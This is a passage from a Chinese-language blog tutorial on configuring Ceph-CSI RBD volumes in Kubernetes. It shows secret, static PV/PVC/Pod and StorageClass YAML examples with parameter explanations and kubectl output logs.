class="hljs-attr">encryptionPassphrase:</span> <span class="hljs-string">test_passphrase</span><br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>userID</code> : 创建的访问 CephFS 的用户名；</li><li><code>userKey</code> : 创建的访问 CephFS 的用户密码；</li><li><code>encryptionPassphrase</code> : 加密密码；</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/rbd/secret.yaml<br>secret/csi-rbd-secret created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,secret -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          26m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          26m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          26m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          25m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   25m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   26m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    27m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          25m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           26m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       26m<br><br>NAME                    TYPE     DATA   AGE<br>secret/csi-rbd-secret   Opaque   3      5s<br></code></pre></td></tr></table></figure><h2 id="6-2、静态配置"><a href="#6-2、静态配置" class="headerlink" title="6.2、静态配置"></a>6.2、静态配置</h2><p>手动创建的 RBD 映像可以挂载到应用程序或从应用程序中卸载，以下步骤展示了如何创建 RBD 映像、静态 PV、静态 PVC 。</p><blockquote><p><strong>注意:</strong> 删除 PV 和 PVC 不会删除后端 RBD 映像，如果需要，用户需要手动删除 RBD 映像。</p></blockquote><h3 id="6-2-1、创建PV"><a href="#6-2-1、创建PV" class="headerlink" title="6.2.1、创建PV"></a>6.2.1、创建PV</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建并修改 ./examples/rbd/static-pv.yaml</span><br>vi ./examples/rbd/static-pv.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/static-pv.yaml</span><br>kubectl create -f ./examples/rbd/static-pv.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,secret,pv -n default<br></code></pre></td></tr></table></figure><p><strong>static-pv.yaml 示例文件:</strong>  (参考资料: <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#create-rbd-static-pv">create-rbd-static-pv</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">rbd-static-pv</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">csi:</span><br>    <span class="hljs-attr">driver:</span> <span class="hljs-string">rbd.csi.ceph.com</span><br>    <span class="hljs-attr">fsType:</span> <span class="hljs-string">ext4</span><br>    <span class="hljs-attr">nodeStageSecretRef:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">csi-rbd-secret</span><br>      <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br>    <span class="hljs-attr">volumeAttributes:</span><br>      <span class="hljs-attr">clusterID:</span> <span class="hljs-string">&quot;13db9fce-5c90-11f0-8c5e-005056854af3&quot;</span><br>      <span class="hljs-attr">pool:</span> <span class="hljs-string">&quot;cephrbd&quot;</span><br>      <span class="hljs-attr">staticVolume:</span> <span class="hljs-string">&quot;true&quot;</span><br>      <span class="hljs-attr">imageFeatures:</span> <span class="hljs-string">&quot;layering&quot;</span><br>      <span class="hljs-comment"># mounter: rbd-nbd</span><br>    <span class="hljs-attr">volumeHandle:</span> <span class="hljs-string">cephrbdimg02</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Retain</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br></code></pre></td></tr></table></figure><p><strong>参数解析:</strong></p><ul><li><code>fsType</code> : </li><li><code>nodeStageSecretRef</code> : <ul><li><code>name</code> : </li><li><code>namespace</code> :</li></ul></li><li><code>volumeAttributes</code> : <ul><li><code>clusterID</code> : Ceph 集群 ID 。必需参数。</li><li><code>pool</code> : 创建 RBD 映像的池名称。必需参数。</li><li><code>staticVolume</code> : 必须将值设置为 true 才能挂载和卸载静态 RBD PVC 。必需参数。</li><li><code>imageFeatures</code> : CSI RBD 目前支持 layering,journaling,exclusive-lock 功能。如果启用了 journaling ，则还必须启用 exclusive-lock 。必需参数。</li><li><code>mounter</code> : 如果设置为 rbd-nbd ，则在具有 rbd-nbd 和 nbd 内核模块的节点上使用 rbd-nbd 来映射 RBD 映像。可选参数。</li></ul></li><li><code>volumeHandle</code> : 对应之前创建的 RBD Image ，这里为 cephrbdimg01 。</li><li><code>persistentVolumeReclaimPolicy</code> : Ceph-CSI 不支持删除静态 PV 的 RBD 映像。该参数必须设置为 Retain ，以避免在 csi-provisioner 中尝试删除 PV 。</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/rbd/static-pv.yaml<br>persistentvolume/rbd-static-pv created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,secret,pv -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          35m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          35m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          35m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          34m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   34m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   35m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    36m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          34m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           35m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       35m<br><br>NAME                    TYPE     DATA   AGE<br>secret/csi-rbd-secret   Opaque   3      9m2s<br><br>NAME                             CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/rbd-static-pv   1Gi        RWO            Retain           Available                          &lt;<span class="hljs-built_in">unset</span>&gt;                          5s<br></code></pre></td></tr></table></figure><h3 id="6-2-2、创建PVC"><a href="#6-2-2、创建PVC" class="headerlink" title="6.2.2、创建PVC"></a>6.2.2、创建PVC</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建并修改 ./examples/rbd/static-pvc.yaml</span><br>vi ./examples/rbd/static-pvc.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/static-pvc.yaml</span><br>kubectl create -f ./examples/rbd/static-pvc.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,secret,pv,pvc -n default<br></code></pre></td></tr></table></figure><p><strong>static-pvc.yaml 示例文件:</strong>  (参考资料: <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#create-rbd-static-pvc">create-rbd-static-pvc</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">rbd-static-pvc</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">volumeName:</span> <span class="hljs-string">rbd-static-pv</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/rbd/static-pvc.yaml<br>persistentvolumeclaim/rbd-static-pvc created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,secret,pv,pvc -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          35m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          35m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          35m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          35m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   35m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   35m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    36m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          35m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           35m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       35m<br><br>NAME                    TYPE     DATA   AGE<br>secret/csi-rbd-secret   Opaque   3      9m39s<br><br>NAME                             CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                    STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/rbd-static-pv   1Gi        RWO            Retain           Bound    default/rbd-static-pvc                  &lt;<span class="hljs-built_in">unset</span>&gt;                          42s<br><br>NAME                                   STATUS   VOLUME          CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/rbd-static-pvc   Bound    rbd-static-pv   1Gi        RWO                           &lt;<span class="hljs-built_in">unset</span>&gt;                 14s<br></code></pre></td></tr></table></figure><h3 id="6-2-3、创建Pod"><a href="#6-2-3、创建Pod" class="headerlink" title="6.2.3、创建Pod"></a>6.2.3、创建Pod</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建并修改 ./examples/rbd/static-pod.yaml</span><br>vi ./examples/rbd/static-pod.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/static-pod.yaml</span><br>kubectl create -f ./examples/rbd/static-pod.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,secret,pv,pvc,pod -n default<br><br><span class="hljs-comment"># 验证 pvc 是否已经在 pod 中挂载</span><br>kubectl <span class="hljs-built_in">exec</span> rbd-static-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www/html<br></code></pre></td></tr></table></figure><p><strong>static-pod.yaml 示例文件:</strong>  (参考资料: <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#verify-rbd-static-pvc">verify-rbd-static-pvc</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">rbd-static-pod</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">docker.io/library/nginx:latest</span><br>      <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">static-pvc</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/var/lib/www/html</span><br>  <span class="hljs-attr">volumes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">static-pvc</span><br>      <span class="hljs-attr">persistentVolumeClaim:</span><br>        <span class="hljs-attr">claimName:</span> <span class="hljs-string">rbd-static-pvc</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/rbd/static-pod.yaml<br>pod/rbd-static-pod created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,secret,pv,pvc,pod -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          38m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          38m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          38m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          38m<br>pod/rbd-static-pod                              1/1     Running   0          59s<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   38m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   38m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    39m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          38m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           38m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       38m<br><br>NAME                    TYPE     DATA   AGE<br>secret/csi-rbd-secret   Opaque   3      12m<br><br>NAME                             CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                    STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/rbd-static-pv   1Gi        RWO            Retain           Bound    default/rbd-static-pvc                  &lt;<span class="hljs-built_in">unset</span>&gt;                          3m38s<br><br>NAME                                   STATUS   VOLUME          CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/rbd-static-pvc   Bound    rbd-static-pv   1Gi        RWO                           &lt;<span class="hljs-built_in">unset</span>&gt;                 3m10s<br><br><br>[bugwz@node03 ceph-csi]$ kubectl <span class="hljs-built_in">exec</span> rbd-static-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www/html<br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/rbd1       4.9G   24K  4.9G   1% /var/lib/www/html<br></code></pre></td></tr></table></figure><h2 id="6-3、动态配置"><a href="#6-3、动态配置" class="headerlink" title="6.3、动态配置"></a>6.3、动态配置</h2><h3 id="6-3-1、创建StorageClass"><a href="#6-3-1、创建StorageClass" class="headerlink" title="6.3.1、创建StorageClass"></a>6.3.1、创建StorageClass</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编辑 ./examples/rbd/storageclass.yaml</span><br>vi ./examples/rbd/storageclass.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/storageclass.yaml</span><br>kubectl apply -f ./examples/rbd/storageclass.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass -n default<br></code></pre></td></tr></table></figure><p><strong>storageclass.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/rbd/storageclass.yaml">.&#x2F;examples&#x2F;rbd&#x2F;storageclass.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-rbd-sc</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">rbd.csi.ceph.com</span><br><span class="hljs-comment"># volumeBindingMode: WaitForFirstConsumer</span><br><span class="hljs-attr">parameters:</span><br>  <span class="hljs-attr">clusterID:</span> <span class="hljs-string">13db9fce-5c90-11f0-8c5e-005056854af3</span><br>  <span class="hljs-comment"># dataPool: &lt;ec-data-pool&gt;</span><br>  <span class="hljs-attr">pool:</span> <span class="hljs-string">cephrbd</span><br>  <span class="hljs-attr">imageFeatures:</span> <span class="hljs-string">&quot;layering&quot;</span><br>  <span class="hljs-comment"># mkfsOptions: &quot;-m0 -Ediscard -i1024&quot;</span><br>  <span class="hljs-comment"># tryOtherMounters: false</span><br>  <span class="hljs-comment"># mapOptions: &quot;krbd:lock_on_read,queue_depth=1024;nbd:try-netlink&quot;</span><br>  <span class="hljs-comment"># unmapOptions: &quot;krbd:force;nbd:force&quot;</span><br>  <span class="hljs-attr">csi.storage.k8s.io/provisioner-secret-name:</span> <span class="hljs-string">csi-rbd-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/provisioner-secret-namespace:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">csi.storage.k8s.io/controller-expand-secret-name:</span> <span class="hljs-string">csi-rbd-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/controller-expand-secret-namespace:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-stage-secret-name:</span> <span class="hljs-string">csi-rbd-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-stage-secret-namespace:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">csi.storage.k8s.io/fstype:</span> <span class="hljs-string">ext4</span><br>  <span class="hljs-comment"># mounter: rbd-nbd</span><br>  <span class="hljs-comment"># cephLogDir: /var/log/ceph</span><br>  <span class="hljs-comment"># cephLogStrategy: remove</span><br>  <span class="hljs-comment"># volumeNamePrefix: &quot;foo-bar-&quot;</span><br>  <span class="hljs-comment"># encrypted: &quot;false&quot;</span><br>  <span class="hljs-comment"># encryptionType: &quot;block&quot;</span><br>  <span class="hljs-comment"># encryptionKMSID: &lt;kms-config-id&gt;</span><br>  <span class="hljs-comment"># topologyConstrainedPools: |</span><br>  <span class="hljs-comment">#   [</span><br>  <span class="hljs-comment">#     &#123;</span><br>  <span class="hljs-comment">#       &quot;poolName&quot;:&quot;pool0&quot;,</span><br>  <span class="hljs-comment">#       &quot;dataPool&quot;:&quot;ec-pool0&quot; # 可选，用于数据的纠删码池</span><br>  <span class="hljs-comment">#       &quot;domainSegments&quot;: [</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;region&quot;,&quot;value&quot;:&quot;east&quot;&#125;,</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;zone&quot;,&quot;value&quot;:&quot;zone1&quot;&#125;</span><br>  <span class="hljs-comment">#       ]</span><br>  <span class="hljs-comment">#     &#125;,</span><br>  <span class="hljs-comment">#     &#123;</span><br>  <span class="hljs-comment">#       &quot;poolName&quot;:&quot;pool1&quot;,</span><br>  <span class="hljs-comment">#       &quot;dataPool&quot;:&quot;ec-pool1&quot; # 可选，用于数据的纠删码池</span><br>  <span class="hljs-comment">#       &quot;domainSegments&quot;:[</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;region&quot;,&quot;value&quot;:&quot;east&quot;&#125;,</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;zone&quot;,&quot;value&quot;:&quot;zone2&quot;&#125;</span><br>  <span class="hljs-comment">#       ]</span><br>  <span class="hljs-comment">#     &#125;,</span><br>  <span class="hljs-comment">#     &#123;</span><br>  <span class="hljs-comment">#       &quot;poolName&quot;:&quot;pool2&quot;,</span><br>  <span class="hljs-comment">#       &quot;dataPool&quot;:&quot;ec-pool2&quot; # 可选，用于数据的纠删码池</span><br>  <span class="hljs-comment">#       &quot;domainSegments&quot;:[</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;region&quot;,&quot;value&quot;:&quot;west&quot;&#125;,</span><br>  <span class="hljs-comment">#         &#123;&quot;domainLabel&quot;:&quot;zone&quot;,&quot;value&quot;:&quot;zone1&quot;&#125;</span><br>  <span class="hljs-comment">#       ]</span><br>  <span class="hljs-comment">#     &#125;</span><br>  <span class="hljs-comment">#   ]</span><br>  <span class="hljs-comment"># stripeUnit: &lt;&gt;</span><br>  <span class="hljs-comment"># stripeCount: &lt;&gt;</span><br>  <span class="hljs-comment"># objectSize: &lt;&gt;</span><br>  <span class="hljs-comment"># BaseReadIops: &lt;&gt;</span><br>  <span class="hljs-comment"># BaseWriteIops: &lt;&gt;</span><br>  <span class="hljs-comment"># BaseReadBytesPerSecond: &lt;&gt;</span><br>  <span class="hljs-comment"># BaseWriteBytesPerSecond: &lt;&gt;</span><br>  <span class="hljs-comment"># ReadIopsPerGiB: &lt;&gt;</span><br>  <span class="hljs-comment"># WriteIopsPerGiB: &lt;&gt;</span><br>  <span class="hljs-comment"># ReadBpsPerGiB: &lt;&gt;</span><br>  <span class="hljs-comment"># WriteBpsPerGiB: &lt;&gt;</span><br>  <span class="hljs-comment"># BaseVolSizeBytes:&lt;&gt;</span><br><span class="hljs-attr">reclaimPolicy:</span> <span class="hljs-string">Delete</span><br><span class="hljs-attr">allowVolumeExpansion:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">mountOptions:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">discard</span><br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>clusterID</code> : Ceph 集群 ID 。确保与 csi-config-map.yaml 中的集群 ID 保持一致。必需参数。</li><li><code>dataPool</code> : 如果要使用带有 RBD 的纠删码池，则需要创建两个池。一个是纠删码池，一个是复制池。该参数用于设置对应的纠删码池。可选参数。</li><li><code>pool</code> : Ceph 池名称，将会在其中存储卷数据。如果指定了 dataPool 的值，则该值用于设置对应额复制池，用于存储Image元数据。必需参数。</li><li><code>imageFeatures</code> : RBD 图像功能，可选值为 layering,journaling,exclusive-lock,object-map,fast-diff,deep-flatten 。可选参数。</li><li><code>mkfsOptions</code> : 在 RBD 设备上创建文件系统时传递给 <code>mkfs</code> 命令的选项。当指定值后将取代默认值。默认选项取决于 csi.storage.k8s.io&#x2F;fstype 类型。可选参数。<ul><li>ext4 时，默认值为 <code>-m0 -Enodiscard,lazy_itable_init=1,lazy_journal_init=1</code> ；</li><li>xfs 时，默认值为 <code>-K</code> ；</li></ul></li><li><code>tryOtherMounters</code> : 指定是否在当前挂载器无法挂载 rbd 图像时尝试其他挂载器。默认为 false 。可选参数。</li><li><code>mapOptions</code> : 以逗号分隔的映射选项列表。默认为空。可选参数。<ul><li>krbd 选项，请参阅 <a href="https://docs.ceph.com/docs/master/man/8/rbd/#kernel-rbd-krbd-options">https://docs.ceph.com/docs/master/man/8/rbd/#kernel-rbd-krbd-options</a></li><li>nbd 选项，请参阅 <a href="https://docs.ceph.com/docs/master/man/8/rbd-nbd/#options">https://docs.ceph.com/docs/master/man/8/rbd-nbd/#options</a></li></ul></li><li><code>unmapOptions</code> : 以逗号分隔的取消映射选项列表。默认为空。可选参数。<ul><li>krbd 选项，请参阅 <a href="https://docs.ceph.com/docs/master/man/8/rbd/#kernel-rbd-krbd-options">https://docs.ceph.com/docs/master/man/8/rbd/#kernel-rbd-krbd-options</a></li><li>nbd 选项，请参阅 <a href="https://docs.ceph.com/docs/master/man/8/rbd-nbd/#options">https://docs.ceph.com/docs/master/man/8/rbd-nbd/#options</a></li></ul></li><li><code>csi.storage.k8s.io/fstype</code> : 指定卷的文件系统类型。如果未指定。可选参数。</li><li><code>mounter</code> : 设置挂载器。可选参数。</li><li><code>cephLogDir</code> : Ceph 客户端日志位置。可选参数。</li><li><code>cephLogStrategy</code> : Ceph 客户端日志策略。默认为 remove 。可选参数。<ul><li>remove : 取消映射时删除日志；</li><li>compress : 取消映射时仅压缩而不删除；</li><li>preserve : 取消映射时保留日志文件的文本格式；</li></ul></li><li><code>volumeNamePrefix</code> : RBD 映像的前缀。默认为 csi-vol- 。可选参数。</li><li><code>encrypted</code> : 是否加密卷。默认为 false 。可选参数。</li><li><code>encryptionType</code> : 当启用加密卷时对应的加密类型。默认为 block 。可选参数。<ul><li>file : 在挂载的文件系统上启用文件加密；</li><li>block : 加密 RBD 块设备；</li></ul></li><li><code>encryptionKMSID</code> : 指定与 KMS ConfigMap 匹配的唯一 ID 使用外部密钥管理系统进行加密密码。可选参数。</li><li><code>topologyConstrainedPools</code> : 拓扑约束池配置，如果设置了基于拓扑的池，并且需要拓扑约束供应。可选参数。</li><li><code>stripeUnit</code> : 图像条带化，条带单位（以字节为单位）。可选参数。</li><li><code>stripeCount</code> : 图像条带化，在循环之前要条带化的对象。可选参数。</li><li><code>objectSize</code> : 图像条带化，对象大小（以字节为单位）。可选参数。</li><li><code>BaseReadIops</code> : RBD 卷 QoS ，每秒读取操作的基本限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>BaseWriteIops</code> : RBD 卷 QoS ，每秒写入操作的基本限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>BaseReadBytesPerSecond</code> : RBD 卷 QoS ，每秒读取字节的基本限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>BaseWriteBytesPerSecond</code> : RBD 卷 QoS ，每秒写入字节的基本限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>ReadIopsPerGiB</code> : RBD 卷 QoS ，每 GiB 的读取操作限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>WriteIopsPerGiB</code> : RBD 卷 QoS ，每 GiB 的写入操作限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>ReadBpsPerGiB</code> : RBD 卷 QoS ，每 GiB 的读取字节限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>WriteBpsPerGiB</code> : RBD 卷 QoS ，每 GiB 的写入字节限制。仅支持 rbd-nbd 挂载类型。可选参数。</li><li><code>BaseVolSizeBytes</code> : RBD 卷 QoS ，用于根据容量计算 qos 的卷的最小大小。仅支持 rbd-nbd 挂载类型。可选参数。</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/rbd/storageclass.yaml<br>storageclass.storage.k8s.io/csi-rbd-sc created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          42m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          42m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          42m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          42m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   42m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   